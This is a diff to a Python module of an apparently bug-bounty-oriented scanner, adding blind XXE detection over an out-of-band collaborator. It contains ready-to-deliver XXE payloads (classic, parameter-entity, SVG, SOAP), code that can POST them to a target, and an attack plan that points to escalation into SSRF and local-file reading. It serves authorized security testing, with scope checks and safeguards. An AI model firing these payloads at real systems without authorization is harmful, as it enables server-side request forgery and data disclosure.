@@ -45,6 +45,7 @@ def _is_crawler_ua(ua: str) -> bool:
 from bughunter.active_verify_service import (
     _ActiveError,
     _Http,
+    _NoRedirect,
     _candidate_params,
     _with_query,
     host_in_active_scope,
@@ -229,3 +230,198 @@ def confirm_blind_ssrf(
         return {"ok": False, "error": poll_errors[0]}
     return {"ok": True, "status": "no-callback", "params_tried": tried, "poll_errors": poll_errors,
             "reason": "no out-of-band callback was observed for these parameters (no blind SSRF proven here)."}
+
+
+# ---- Blind XXE over OOB -------------------------------------------------------------------
+def build_xxe_payloads(base: str, token: str) -> dict[str, str]:
+    """Ready-to-deliver blind-XXE payload variants with the collaborator callback embedded as
+    an EXTERNAL ENTITY. The entity only makes the parser fetch the callback (proving external-
+    entity resolution) — it reads NO target file, so confirmation never exfiltrates data.
+    The operator pastes one of these into an XML-parsing endpoint (or GreyIQ POSTs ``classic``
+    via the opt-in --send)."""
+    cb = callback_url(base, token)
+    return {
+        "classic": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                    f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{cb}">]>\n<r>&xxe;</r>'),
+        "parameter_entity": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                             f'<!DOCTYPE r [<!ENTITY % ext SYSTEM "{cb}"> %ext;]>\n<r>probe</r>'),
+        "svg": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{cb}">]>\n'
+                f'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">&xxe;</svg>'),
+        "soap": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
+                 f'<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "{cb}">]>\n'
+                 f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
+                 f'<soap:Body><probe>&xxe;</probe></soap:Body></soap:Envelope>'),
+    }
+
+
+def _post_xml(url: str, xml: str, *, timeout: float) -> dict[str, Any]:
+    """POST a fixed XML body to an ALREADY scope-checked + SSRF-guarded URL, never following a
+    redirect (so the body can't be replayed off-host). The only non-GET egress in the engine,
+    reached solely via the opt-in --send. An HTTP error response is fine — the external entity
+    may still have been resolved during parsing before the error was produced."""
+    request = urllib.request.Request(
+        url, data=xml.encode("utf-8"), method="POST",
+        headers={"Content-Type": "application/xml", "User-Agent": _USER_AGENT, "Accept": "*/*"})
+    opener = urllib.request.build_opener(_NoRedirect())
+    try:
+        with opener.open(request, timeout=timeout) as resp:
+            return {"ok": True, "status": getattr(resp, "status", 0)}
+    except urllib.error.HTTPError as exc:
+        return {"ok": True, "status": exc.code}
+    except (urllib.error.URLError, OSError, ValueError) as exc:
+        return {"ok": False, "error": f"XML POST failed: {exc}"}
+
+
+def _build_xxe_finding(target_url: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
+    word = "confirmed" if confirmed else "callback from a non-server source — candidate"
+    ua = (hit.get("headers") or {}).get("user-agent", "?")
+    return {
+        "rule_id": "active.blind-xxe-oob",
+        "title": f"Blind XXE (out-of-band {word})",
+        "severity": "high",
+        "confidence": "high" if confirmed else "medium",
+        "category": "xxe",
+        "location": target_url,
+        "file_path": target_url,
+        "line_start": 1, "line_end": 1,
+        "class_id": "xxe",
+        "class_name": "XML External Entity (XXE)",
+        "cwe": "CWE-611",
+        "owasp": "A05:2021 Security Misconfiguration",
+        "references": [
+            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
+            "https://portswigger.net/web-security/xxe/blind",
+        ],
+        "remediation": ("Disable external-entity and DTD processing in the XML parser (set FEATURE_SECURE_PROCESSING / "
+                        "disallow-doctype-decl; for libxml2 do not set NOENT/DTDLOAD). Prefer a hardened parser config."),
+        "snippet": "",  # the proof is the OOB callback, not any file contents — nothing is exfiltrated
+        "proof_evidence": {
+            "request_line": f"POST {target_url}  (Content-Type: application/xml)",
+            "response_status": f"collaborator hit: {hit.get('method', 'GET')} {hit.get('path', '/oob/' + token)}",
+            "matched_value": (f"the XML parser resolved an external entity and made an out-of-band "
+                              f"{hit.get('method', 'GET')} request to collaborator token {token} "
+                              f"(source {hit.get('ip', '?')}, UA {ua}) — "
+                              + ("blind XXE confirmed (the fresh token was empty before the probe)" if confirmed
+                                 else "but the source looks like a crawler/preview bot; verify the source before submitting")),
+        },
+    }
+
+
+def _xxe_plan(target_url: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
+    cb = callback_url(base, token)
+    return {
+        "steps": [
+            f"Submit an XML document containing an external entity pointing at a collaborator you control: {cb}",
+            f"Send it to the XML-parsing endpoint at {target_url} (Content-Type: application/xml).",
+            f"Observe an inbound {hit.get('method', 'GET')} hit on the collaborator for token {token} "
+            f"(from {hit.get('ip', 'the target')}) — the parser resolved the external entity.",
+            "Escalate within scope: swap the entity for an internal/metadata URL (blind SSRF via XXE) or a "
+            "parameter-entity exfil chain to read local files — only as far as your authorization allows.",
+        ],
+        "poc": f"POST {target_url}\nContent-Type: application/xml\n\n{build_xxe_payloads(base, token)['classic']}\n"
+               f"# -> out-of-band callback recorded at {cb}",
+        "impact": ("XML external-entity processing lets an attacker make the server fetch attacker-chosen URLs "
+                   "(internal services, cloud metadata) and, depending on the parser, read local files — SSRF and "
+                   "file disclosure from a single XML submission."),
+        "cvss": {"vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", "base_score": 8.6, "base_severity": "high", "estimated": True},
+        "remediation": "Disable DTDs / external-entity resolution in the XML parser; use a hardened, secure-processing config.",
+        "proof_of_impact": {
+            "status": "confirmed" if confirmed else "candidate",
+            "method": "out-of-band callback (collaborator) — the external entity only fetches the callback; no file is exfiltrated into the report",
+            "affected_asset": "internal services / cloud metadata (via XXE-SSRF) and, depending on the parser, local files",
+            "observed_result": f"the XML parser at the endpoint made an out-of-band {hit.get('method', 'GET')} request to token {token}",
+            "control_result": "without the injected external entity the collaborator records nothing for this fresh token",
+            "evidence": f"collaborator interaction for token {token} ({hit.get('method', 'GET')} {hit.get('path', '')})",
+        },
+    }
+
+
+def _xxe_finding_from_hit(sanitized: str, token: str, base: str, hit: dict[str, Any]) -> dict[str, Any]:
+    ua = (hit.get("headers") or {}).get("user-agent", "")
+    confirmed = not _is_crawler_ua(ua)
+    finding = _build_xxe_finding(sanitized, token, base, hit, confirmed)
+    finding["ref"] = "F1"
+    return {"ok": True, "status": "confirmed" if confirmed else "candidate", "token": token,
+            "finding": finding, "attack_plan": _xxe_plan(sanitized, token, base, hit, confirmed),
+            "detail": {"hit": hit, "negative_control": "the fresh token was empty before the probe"}}
+
+
+def confirm_blind_xxe(
+    target_url: str,
+    *,
+    base: str,
+    secret: str,
+    scope: str = "",
+    send: bool = False,
+    token: str | None = None,
+    settings: Any = None,
+    poll_attempts: int = 4,
+    poll_delay_s: float = 2.0,
+) -> dict[str, Any]:
+    """Confirm blind XXE out-of-band. Two modes:
+
+    * **Assisted (default, GET-only):** mint a token, hand back ready XXE payload variants with
+      the callback embedded (status ``ready``); the operator delivers one to an XML endpoint,
+      then re-calls with the SAME ``token`` to poll — a recorded hit builds the confirmed finding.
+    * **Auto (``send=True``):** GreyIQ itself POSTs the ``classic`` payload to the in-scope,
+      SSRF-guarded target (the only non-GET egress), then polls. Negative-control + crawler-UA
+      hardening identical to the SSRF path.
+    """
+    settings = settings or get_settings()
+    if not str(base or "").strip() or not str(secret or "").strip():
+        return {"ok": False, "error": "Configure the OOB collaborator URL + secret first."}
+    try:
+        normalized = normalize_website_url(target_url)
+    except WebsiteFetchError as exc:
+        return {"ok": False, "error": str(exc)}
+    host = urlparse(normalized).hostname or ""
+    if not host_in_active_scope(host, scope, settings):
+        return {"ok": False, "error": f"'{host}' is not named in your scope — OOB probing is fail-closed."}
+    try:
+        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
+    except WebsiteFetchError as exc:
+        return {"ok": False, "error": f"target refused by the URL guard: {exc}"}
+
+    fresh = not str(token or "").strip()
+    token = str(token or "").strip() or mint_token()
+    payloads = build_xxe_payloads(base, token)
+
+    if send:
+        # Pre-probe NEGATIVE CONTROL before we POST: the token must be empty, else a later hit
+        # can't be attributed to our probe.
+        pre = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
+        if not pre.get("ok"):
+            return {"ok": False, "error": pre.get("error", "collaborator poll failed")}
+        if pre.get("count"):
+            return {"ok": False, "error": "the collaborator token already has hits before the probe — mint a fresh one and retry."}
+        post = _post_xml(sanitized, payloads["classic"], timeout=settings.web_fetch_timeout_seconds)
+        if not post.get("ok"):
+            return {"ok": True, "status": "send-failed", "token": token, "payloads": payloads, "error": post.get("error")}
+        poll_errors: list[str] = []
+        for _ in range(max(1, poll_attempts)):
+            time.sleep(max(0.0, poll_delay_s))
+            res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
+            if not res.get("ok"):
+                poll_errors.append(res.get("error", "poll failed"))
+                break
+            if res.get("count"):
+                return _xxe_finding_from_hit(sanitized, token, base, (res.get("hits") or [{}])[0])
+        return {"ok": True, "status": "no-callback", "token": token, "sent": True, "payloads": payloads,
+                "poll_errors": poll_errors,
+                "reason": "the payload was sent (POST) but no out-of-band callback was observed (no blind XXE proven here)."}
+
+    # Assisted mode.
+    if fresh:
+        return {"ok": True, "status": "ready", "token": token, "payloads": payloads,
+                "callback_url": callback_url(base, token),
+                "reason": (f"Deliver one of these XXE payloads to an XML-parsing endpoint out of band, then re-run with "
+                           f"token {token} to poll for the callback (or pass send=True to have GreyIQ POST the classic payload).")}
+    # Re-poll a token the operator already delivered to (its negative control was the fresh mint).
+    res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
+    if not res.get("ok"):
+        return {"ok": False, "error": res.get("error", "collaborator poll failed")}
+    if res.get("count"):
+        return _xxe_finding_from_hit(sanitized, token, base, (res.get("hits") or [{}])[0])
+    return {"ok": True, "status": "no-callback", "token": token, "payloads": payloads,
+            "reason": "no callback yet for this token — deliver the payload to an XML endpoint, then poll again."}
